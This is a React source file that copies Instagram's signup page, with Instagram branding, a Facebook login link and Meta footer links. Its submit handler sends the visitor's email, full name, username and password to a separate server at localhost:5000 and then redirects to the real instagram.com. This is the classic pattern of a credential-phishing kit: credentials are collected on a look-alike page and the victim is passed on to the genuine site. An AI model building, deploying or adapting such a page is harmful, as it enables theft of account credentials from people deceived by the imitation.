import logo from '../img/instalogo.png';
import gpay from '../img/google_play.png';
import microsoft from '../img/microsoft.png';
import { useState } from 'react';
import axios from 'axios';
export default function Signup(){
  const [email,setEmail] = useState("");
  const [name,setName] = useState("");
  const [username,setUsername] = useState("");
  const [password,setPassword] = useState("");
  const handleSubmit = async (e) =>{
    e.preventDefault();
    const response = await axios.post('http://localhost:5000/signup',{
      email:email,
      name:name,
      username:username,
      password:password
    });
    
    if(response){
      window.location.href = 'https://www.instagram.com';
    }

  }
    return(
        <section className="mt-3">
        <div className="loginpage">
          <div className="container">
            <div className="form-signin m-auto">
              <form>
                <div className="instalogo-img">
                  <img src={logo} alt="instalogo" />
                </div>
                <div className="or-data">
                  <div className="insta-data">
                    <p>Sign up to see photos and videos from your friends.</p>
                  </div>
                  <div className="facebook">
                    <div className="facebook-SingUp-data">
                      <i className="fa-brands fa-square-facebook"></i>
                      <a href="#">Log in with Facebook</a>
                    </div>
                  </div>
                  <div className="row sing-row-or mt-4">
                    <div className="col-5 sg"></div>
                    <div className="col-2 or">OR</div>
                    <div className="col-5 sg"></div>
                  </div>
                </div>
                <div className="insta-input">
                  <div className="input-group input-group-sm my-2">
                    <input
                      type="email"
                      className="form-control"
                      placeholder="Phone number, or email"
                      value={email}
                      onChange={e => setEmail(e.target.value)}
                    />
                  </div>
                  <div className="input-group input-group-sm my-2">
                    <input
                      type="text"
                      className="form-control"
                      placeholder="Full Name"
                      value={name}
                      onChange={e => setName(e.target.value)}
                    />
                  </div>
                  <div className="input-group input-group-sm my-2">
                    <input
                      type="text"
                      className="form-control"
                      placeholder="Username"
                      value={username}
                      onChange={e => setUsername(e.target.value)}
                    />
                  </div>
                  <div className="input-group input-group-sm my-2">
                    <input
                      type="password"
                      className="form-control"
                      id="floatingPassword"
                      placeholder="Password"
                      value={password}
                      onChange={e => setPassword(e.target.value)}
                    />
                  </div>
                  <div className="sing-p-data">
                    <p>
                      People who use our service may have uploaded your contact
                      information to Instagram.
                      <a href="#">Learn More</a>
                    </p>
                    <p>
                      By signing up, you agree to our
                      <a href="#">Terms</a> ,
                      <a href="#">Privacy Policy</a> and
                      <a href="#">Cookies Policy</a> .
                    </p>
                  </div>
                  <button className="btn btn-primary w-100 mt-2" onClick={handleSubmit} type="submit">
                    Sign up
                  </button>
                </div>
              </form>
            </div>
            <div className="form-signin m-auto">
              <p className="account">
                Have an account? <a href="/">Log in</a>
              </p>
            </div>
            <div className="get_app">
              <div className="get-text">
                <p className="account">Get the app.</p>
              </div>
              <div className="getapp-img m-auto">
                <div className="app-img">
                  <a href="#">
                    <img src={gpay} alt="google_play" />
                  </a>
                  <a className="microsoft" href="#">
                    <img src={microsoft} alt="microsoft" />
                  </a>
                </div>
              </div>
            </div>
  
            <div className="all-link">
              <div className="top-link">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
              </div>
              <div className="bottom-link">
                <a href="#" className="dropdown-toggle">English</a>
                <span href="#">© 2024 Instagram from Meta</span>
              </div>
            </div>
          </div>
        </div>
      </section>
    );

}